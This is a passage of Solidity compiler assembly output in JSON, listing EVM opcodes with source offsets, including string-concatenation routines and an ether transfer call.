											"end": 96,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 89,
											"end": 101,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 123,
											"end": 125,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 118,
											"end": 121,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 114,
											"end": 126,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "SWAP1",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 148,
											"end": 150,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 143,
											"end": 146,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 139,
											"end": 151,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "SWAP3",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "70"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "72"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 274,
											"end": 275,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 267,
											"end": 270,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 263,
											"end": 265,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 259,
											"end": 271,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 254,
											"end": 257,
											"name": "PUSH",
											"source": -1,
											"value": "100"
										},
										{
											"begin": 250,
											"end": 272,
											"name": "EXP",
											"source": -1
										},
										{
											"begin": 246,
											"end": 276,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 315,
											"end": 319,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 311,
											"end": 320,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 305,
											"end": 308,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 299,
											"end": 309,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 295,
											"end": 321,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 356,
											"end": 360,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 350,
											"end": 353,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 344,
											"end": 354,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 340,
											"end": 361,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 389,
											"end": 396,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 380,
											"end": 387,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 377,
											"end": 397,
											"name": "OR",
											"source": -1
										},
										{
											"begin": 372,
											"end": 375,
											"name": "DUP6",
											"source": -1
										},
										{
											"begin": 365,
											"end": 398,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 49,
											"end": 53,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 39,
											"end": 46,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 30,
											"end": 37,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 13,
											"end": 20,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 7836,
											"end": 7884,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 7836,
											"end": 7884,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7836,
											"end": 7884,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 5568,
											"end": 5726,
											"name": "tag",
											"source": 3,
											"value": "32"
										},
										{
											"begin": 5568,
											"end": 5726,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 5596,
											"end": 5606,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 5609,
											"end": 5640,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "74"
										},
										{
											"begin": 5626,
											"end": 5639,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "75"
										},
										{
											"begin": 5626,
											"end": 5637,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "36"
										},
										{
											"begin": 5626,
											"end": 5639,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 5626,
											"end": 5639,
											"name": "tag",
											"source": 3,
											"value": "75"
										},
										{
											"begin": 5626,
											"end": 5639,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 5609,
											"end": 5625,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "37"
										},
										{
											"begin": 5609,
											"end": 5640,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 5609,
											"end": 5640,
											"name": "tag",
											"source": 3,
											"value": "74"
										},
										{
											"begin": 5609,
											"end": 5640,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 5596,
											"end": 5640,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 5596,
											"end": 5640,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 5645,
											"end": 5670,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 5681,
											"end": 5683,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 5645,
											"end": 5684,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 5645,
											"end": 5684,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 5689,
											"end": 5698,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 5689,
											"end": 5707,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5689,
											"end": 5707,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "PUSH",
											"source": 3,
											"value": "8FC"
										},
										{
											"begin": 5708,
											"end": 5720,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "76"
										},
										{
											"begin": 5708,
											"end": 5718,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "39"
										},
										{
											"begin": 5708,
											"end": 5720,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 5708,
											"end": 5720,
											"name": "tag",
											"source": 3,
											"value": "76"
										},
										{
											"begin": 5708,
											"end": 5720,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "MUL",
											"source": 3
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "DUP6",
											"source": 3
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "DUP9",
											"source": 3
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "DUP9",
											"source": 3
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "CALL",
											"source": 3
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "SWAP4",
											"source": 3
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "78"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY",
											"source": -1
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"source": -1,
											"value": "78"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 5689,
											"end": 5721,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 5568,
											"end": 5726,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 5568,
											"end": 5726,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 5568,
											"end": 5726,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 7130,
											"end": 7512,
											"name": "tag",
											"source": 3,
											"value": "36"
										},
										{
											"begin": 7130,
											"end": 7512,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 7175,
											"end": 7188,
											"name": "PUSH",
											"source": 3,
											"value": "60"
										},
										{
											"begin": 7195,
											"end": 7222,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7225,
											"end": 7242,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "80"
										},
										{
											"begin": 7225,
											"end": 7240,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "46"
										},
										{
											"begin": 7225,
											"end": 7242,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 7225,
											"end": 7242,
											"name": "tag",
											"source": 3,
											"value": "80"
										},
										{
											"begin": 7225,
											"end": 7242,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 7195,
											"end": 7242,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7195,
											"end": 7242,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7247,
											"end": 7276,
											"name": "PUSH",
											"source": 3,
											"value": "60"
										},
										{
											"begin": 7279,
											"end": 7300,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "81"
										},
										{
											"begin": 7279,
											"end": 7298,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "48"
										},
										{
											"begin": 7279,
											"end": 7300,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 7279,
											"end": 7300,
											"name": "tag",
											"source": 3,
											"value": "81"
										},
										{
											"begin": 7279,
											"end": 7300,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 7247,
											"end": 7300,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7247,
											"end": 7300,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7305,
											"end": 7334,
											"name": "PUSH",
											"source": 3,
											"value": "60"
										},
										{
											"begin": 7337,
											"end": 7358,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "82"
										},
										{
											"begin": 7337,
											"end": 7356,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "50"
										},
										{
											"begin": 7337,
											"end": 7358,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 7337,
											"end": 7358,
											"name": "tag",
											"source": 3,
											"value": "82"
										},
										{
											"begin": 7337,
											"end": 7358,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 7305,
											"end": 7358,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7305,
											"end": 7358,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7363,
											"end": 7389,
											"name": "PUSH",
											"source": 3,
											"value": "60"
										},
										{
											"begin": 7392,
											"end": 7408,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "83"
										},
										{
											"begin": 7392,
											"end": 7406,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "52"
										},
										{
											"begin": 7392,
											"end": 7408,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 7392,
											"end": 7408,
											"name": "tag",
											"source": 3,
											"value": "83"
										},
										{
											"begin": 7392,
											"end": 7408,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 7363,
											"end": 7408,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7363,
											"end": 7408,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7444,
											"end": 7457,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 7459,
											"end": 7474,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 7476,
											"end": 7491,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 7493,
											"end": 7505,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "DUP6",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "84"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 66,
											"end": 68,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 61,
											"end": 64,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 58,
											"end": 69,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "86"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 182,
											"end": 185,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 176,
											"end": 186,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 171,
											"end": 174,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 164,
											"end": 187,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 98,
											"end": 100,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 93,
											"end": 96,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 89,
											"end": 101,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 123,
											"end": 125,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 118,
											"end": 121,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 114,
											"end": 126,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "SWAP1",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 148,
											"end": 150,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 143,
											"end": 146,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 139,
											"end": 151,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "SWAP3",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "84"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "86"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 274,
											"end": 275,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 267,
											"end": 270,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 263,
											"end": 265,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 259,
											"end": 271,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 254,
											"end": 257,
											"name": "PUSH",
											"source": -1,
											"value": "100"
										},
										{
											"begin": 250,
											"end": 272,
											"name": "EXP",
											"source": -1
										},
										{
											"begin": 246,
											"end": 276,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 315,
											"end": 319,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 311,
											"end": 320,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 305,
											"end": 308,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 299,
											"end": 309,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 295,
											"end": 321,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 356,
											"end": 360,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 350,
											"end": 353,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 344,
											"end": 354,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 340,
											"end": 361,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 389,
											"end": 396,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 380,
											"end": 387,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 377,
											"end": 397,
											"name": "OR",
											"source": -1
										},
										{
											"begin": 372,
											"end": 375,
											"name": "DUP6",
											"source": -1
										},
										{
											"begin": 365,
											"end": 398,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "87"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 66,
											"end": 68,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 61,
											"end": 64,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 58,
											"end": 69,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "89"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 182,
											"end": 185,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 176,
											"end": 186,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 171,
											"end": 174,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 164,
											"end": 187,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 98,
											"end": 100,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 93,
											"end": 96,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 89,
											"end": 101,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 123,
											"end": 125,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 118,
											"end": 121,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 114,
											"end": 126,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "SWAP1",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 148,
											"end": 150,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 143,
											"end": 146,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 139,
											"end": 151,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "SWAP3",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "87"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "89"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 274,
											"end": 275,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 267,
											"end": 270,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 263,
											"end": 265,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 259,
											"end": 271,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 254,
											"end": 257,
											"name": "PUSH",
											"source": -1,
											"value": "100"
										},
										{
											"begin": 250,
											"end": 272,
											"name": "EXP",
											"source": -1
										},
										{
											"begin": 246,
											"end": 276,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 315,
											"end": 319,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 311,
											"end": 320,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 305,
											"end": 308,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 299,
											"end": 309,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 295,
											"end": 321,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 356,
											"end": 360,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 350,
											"end": 353,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 344,
											"end": 354,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 340,
											"end": 361,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 389,
											"end": 396,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 380,
											"end": 387,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 377,
											"end": 397,
											"name": "OR",
											"source": -1
										},
										{
											"begin": 372,
											"end": 375,
											"name": "DUP6",
											"source": -1
										},
										{
											"begin": 365,
											"end": 398,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "90"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 66,
											"end": 68,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 61,
											"end": 64,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 58,
											"end": 69,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "92"
										},
										{
